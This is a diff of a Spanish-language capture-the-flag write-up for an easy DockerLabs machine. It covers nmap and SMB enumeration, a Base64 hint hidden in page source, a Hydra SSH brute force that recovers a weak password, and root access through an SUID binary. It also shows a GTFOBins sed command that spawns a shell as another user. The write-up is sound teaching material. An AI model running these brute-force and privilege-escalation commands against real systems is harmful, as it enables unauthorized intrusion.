@@ -2,13 +2,14 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #ssh #brute-force 
-
+- Tags: #smb #base64 #brute-force #suid-abuse
 
 ![](assets/Pasted%20image%2020251126163705.png)
+
 ## Reconocimiento
 
-Comienzo tirando un ping para comprobar conectividad:
+Comienzo tirando un ping para comprobar la conectividad.
+
 ```bash
 > ping -c 1 172.17.0.2
 ----------------------------------------------------
@@ -20,11 +21,11 @@ PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 rtt min/avg/max/mdev = 3.437/3.437/3.437/0.000 ms
 ```
 
-Realizo un escaneo con nmap para ver que puertos se encuentran abierto
+Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.
+
 ```bash
 > sudo nmap -p- -Pn -n -sS -vvv 172.17.0.2
 --------------------------------------------
-Scanned at 2025-11-26 15:20:59 CST for 2s
 PORT    STATE SERVICE      REASON
 22/tcp  open  ssh          syn-ack ttl 64
 80/tcp  open  http         syn-ack ttl 64
@@ -33,7 +34,9 @@ PORT    STATE SERVICE      REASON
 MAC Address: 46:BB:E8:E3:C2:1B (Unknown)
 ```
 
-Sobre los puertos abiertos realizamos un segundo escaneo mas profundo para detectar servicios, versiones y ejecutar algunos scripts.
+- Puertos 22, 80, 139 y 445 abiertos.
+
+Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
 
 ```bash
 > sudo nmap -p 22,80,139,445 -sV -sC -Pn -n -sS 172.17.0.2 -oN target
@@ -72,60 +75,64 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 | smb2-time: 
 |   date: 2025-11-26T21:23:08
-|_  start_date: N/A'
+|_  start_date: N/A
 ```
 
-- Puerto 80 HTTP: Apache httpd 2.4.7
-- Puerto 22 SSH: OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
-- Puerto 139 y 445 SMB: Samba smbd 3.X - 4.X, Samba smbd 4.3.11-Ubuntu
+- Puerto 22 SSH OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
+- Puerto 80 HTTP Apache httpd 2.4.7 (Ubuntu)
+- Puertos 139 y 445 SMB Samba smbd 4.3.11-Ubuntu
+
 ## Enumeración
 
-#### **Puerto 80 HTTP Pagina Principal**
+### Puerto 80 HTTP
 
-- Al parecer es una pagina para reservaciones.
-- El boton _Go to paradise_, nos redirigue a galery.html
+La página principal muestra un sitio web para reservaciones llamado "Andy's House".
 
 ![](assets/Pasted%20image%2020251126152633.png)
 
+El botón "Go to paradise" redirige a `/galery.html`.
 
+**Página /galery.html**
 
-**Pagina /galery.html**
+La página muestra una galería de imágenes. Inspeccionando el código fuente encuentro un comentario codificado en Base64.
 
-La pagina: `http://172.17.0.2/galery.html` son un montón de imágenes, pero viendo su codigo fuente nos podemos encontrar con esto:
-
-- Un comentario en el codigo fuente codificado en base64 el cual procedo a decodificar.
-```bash
+```html
 <!-- ZXN0b2VzdW5zZWNyZXRvCg== -->
+```
 
+Decodifico el comentario.
+
+```bash
 > echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d; echo
 estoesunsecreto
 ```
 
-- También descubrimos que todas las imágenes, las carga desde un directorio /img
+También noto que todas las imágenes se cargan desde el directorio `/img`.
+
 ```html
-  <div class="gallery-item">
-     <img src="img/image7.jpg" alt="Image 6">
- </div>
+<div class="gallery-item">
+   <img src="img/image7.jpg" alt="Image 6">
+</div>
 ```
 
-Me decidí por utilizar el mensaje como directorio y efectivamente existía un directorio llamado _estoesunsecreto_ y un archivo llamado _mensaje_para_lucas
+Pruebo acceder al directorio usando el mensaje decodificado: `http://172.17.0.2/estoesunsecreto/`
 
 ![](assets/Pasted%20image%2020251126160235.png)
 
+- Encuentro un archivo llamado `mensaje_para_lucas`
 
-**Puerto 139,445 SMB**
+### Puertos 139 y 445 SMB
 
-**Esta enumeracion del SMB, es un paso extra o didáctico, no se requiere para la explotación de la maquina.**
+**Nota:** Esta enumeración SMB es un paso adicional didáctico y no es necesaria para la explotación.
 
-Enumere recursos compartidos con sesiones nulas, pero no encontré nada.
+Enumero recursos compartidos con sesiones nulas, pero no encuentro nada accesible.
+
 ```bash
 nxc smb 172.17.0.2 --shared -u '' -p ''
 ```
 
-Usando `enum4linux` enumere usuarios del servicio SMB: 
+Utilizo `enum4linux` para enumerar usuarios del servicio SMB.
 
-- Comprobamos el usuario lucas, que anteriormente fue mencionado.
-- Encontramos el usuario andy
 ```bash
 > enum4linux 172.17.0.2 -U
 -------------------------------------------------------------------------------
@@ -135,24 +142,23 @@ S-1-22-1-1000 Unix User\andy (Local User)
 S-1-22-1-1001 Unix User\lucas (Local User)
 ```
 
-Utilice estos 2 usuarios para enumerar recursos, incluso brute force para encontrar contraseñas del servicio SMB pero no obtuve nada.
-```bash
-nxc smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt
-```
-
+- Usuarios encontrados: `andy` y `lucas`
 
 ## Explotación
 
-El mensaje anteriormente encontrado nos decía que la contraseña de lucas era débil y que podía ser encontrada por BF (Brute Force) y ya habiendo enumerado el SMB, opte por realizar un ataque de fuerza bruta al servicio ssh
+### Brute Force SSH
+
+El mensaje encontrado anteriormente indica que la contraseña de `lucas` es débil y puede ser encontrada por fuerza bruta. Realizo un ataque de fuerza bruta al servicio SSH.
 
 ```bash
 > hydra -l "lucas" -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 15
 [22][ssh] host: 172.17.0.2   login: lucas   password: chocolate
 ```
 
-- Encontramos las credenciales lucas:chocolate
+- Credenciales encontradas: `lucas:chocolate`
 
-Me conecto al sistema mediante SSH
+Me conecto al sistema mediante SSH.
+
 ```bash
 > ssh lucas@172.17.0.2
 lucas@172.17.0.2's password: chocolate
@@ -160,15 +166,14 @@ $ whoami
 lucas
 $ id
 uid=1001(lucas) gid=1001(lucas) groups=1001(lucas)
-$ 
 ```
 
-### Escalada de Privilegios
+## Escalada de Privilegios
 
+### Búsqueda de Binarios SUID
 
-Dentro del sistema buscamos por binarios con el bit SUID activo
+Busco binarios con el bit SUID activado.
 
-- Encontramos el binario privileged_exec y backup.sh
 ```bash
 lucas@574145c6f7fc:~$ find / -perm -4000 2>/dev/null
 -------------------------------------------------------
@@ -176,7 +181,9 @@ lucas@574145c6f7fc:~$ find / -perm -4000 2>/dev/null
 /usr/local/bin/backup.sh
 ```
 
-Inpseccionmos y ejecutamos los 2 binarios y privileged_exec literalmente escalo privilegios a root lol. 
+- Encuentro dos binarios: `privileged_exec` y `backup.sh`
+
+Inspecciono y ejecuto `privileged_exec`.
 
 ```bash
 lucas@574145c6f7fc:/tmp$ /usr/local/bin/privileged_exec
@@ -187,12 +194,22 @@ root@574145c6f7fc:/tmp# id
 uid=0(root) gid=1001(lucas) groups=0(root),1001(lucas)
 ```
 
-**Extra**
-Dejando de lado que ya somos root, también podíamos migrar al usuario andy abusando del binario sed: [GTFObins](https://gtfobins.github.io/gtfobins/sed/)
+El binario `privileged_exec` literalmente escalo privilegios por mi jeje.
+
+**Escalada Alternativa mediante sed**
+
+_Esto solo es un paso extra, didactico pero no es necesario para migrar a root._
+
+También es posible migrar al usuario `andy` abusando del binario `sed` con privilegios sudo.
 
 ```bash
 > sudo -l
 (andy) NOPASSWD: /bin/sed
+```
+
+Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/sed/) para encontrar formas de abusar de `sed`.
+
+```bash
 lucas@574145c6f7fc:/tmp > sudo -u andy /bin/sed -n '1e exec sh 1>&0' /etc/hosts
 $ whoami
 andy
